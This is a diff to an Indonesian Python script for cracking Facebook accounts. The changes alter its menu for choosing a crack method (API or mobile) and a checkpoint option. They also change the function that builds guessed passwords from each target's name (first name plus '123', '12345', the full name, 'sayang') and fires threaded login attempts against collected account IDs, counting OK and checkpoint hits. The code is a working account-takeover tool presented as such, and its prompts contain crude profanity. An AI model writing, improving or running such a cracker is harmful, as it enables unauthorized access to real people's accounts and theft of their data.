@@ -619,48 +619,27 @@ def setting():
       xx = random.randint(0,len(id2))
       id2.insert(xx,bacot)
   else:
-		print('>> Pilih Yang Bener Kontooll ')
-		exit()
-	print('>> 1. Mobile {h}(Rekomendasi)')
-	print('>> 2. Mbasic ')
-	print('>> 3. Touch  ')
-	print('>> 4. Mtouch ')
-	print('')
-	hc = input('>> Pilih : ')
-	if hc in ['1','01']:
-		method.append('mobile')
-	elif hc in ['']:
-		print('>> Pilih Yang Bener Kontol ')
-		setting()
-#	elif hc in ['2','02']:
-#		method.append('free')
-#	elif hc in ['3','03']:
-#		method.append('touch')
-	elif hc in ['4','04']:
-		method.append('mbasic')
-	else:
-		method.append('mobile')
-	print('')
-	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
-	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
-		back()
-	elif _jembot_ in ['y','Y']:
-		taplikasi.append('ya')
-	else:
-		taplikasi.append('no')
-	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
-	if pwplus in ['y','Y']:
-		pwpluss.append('ya')
-		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('>> Masukkan Password Tambahan : ')
-		pwkuh=pwku.split(',')
-		for xpw in pwkuh:
-			pwnya.append(xpw)
-	else:
-		pwpluss.append('no')
-	passwrd()
-
+    ric = '# PILIHAN TIDAK ADA DI MENU'
+    sol().print(mark(ric, style='red'))
+    exit()
+  met = '# PILIH METHOD CRACK'
+  sol().print(mark(met, style='green'))
+  ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)'
+  gess = nel(ioz, style='cyan')
+  cetak(nel(gess, title='METHOD'))
+  hc = input(x+'['+p+'f'+x+'] Pilih : ')
+  if hc in ['1','01']:
+    method.append('api')
+  else:
+    method.append('mobile')
+  guw = '# INGIN OPSI CRACK?'
+  sol().print(mark(guw, style='green'))
+  osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
+  if osk in ['y','Y']:
+    oprek.append('ya')
+  else:
+    oprek.append('no')
+  passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
 	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Meretas Sistem FB {m}•{k}•{h}•{x} <<<<< ')
@@ -671,39 +650,29 @@ def passwrd():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'touch' in method:
-				pool.submit(cracktouch,idf,pwv)
-			elif 'mbasic' in method:
-				pool.submit(crackmbasic,idf,pwv)
-			else:
-				pool.submit(crackmbasic,idf,pwv)
-	print('')
+      frs = nmf.split(' ')[0]
+      pwv = []
+      if len(nmf)<6:
+        if len(frs)<3:
+          pass
+        else:
+          pwv.append(frs+'123')
+          pwv.append(frs+'12345')
+      else:
+        if len(frs)<3:
+          pwv.append(nmf)
+        else:
+          pwv.append(nmf)
+          pwv.append(frs+'123')
+          pwv.append(frs+'12345')
+      pwv.append('sayang')
+      if 'mobile' in method:
+        pool.submit(crack,idf,pwv)
+      elif 'api' in method:
+        pool.submit(crack2,idf,pwv)
+      else:
+        pool.submit(crack,idf,pwv)
+  print('')
 	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
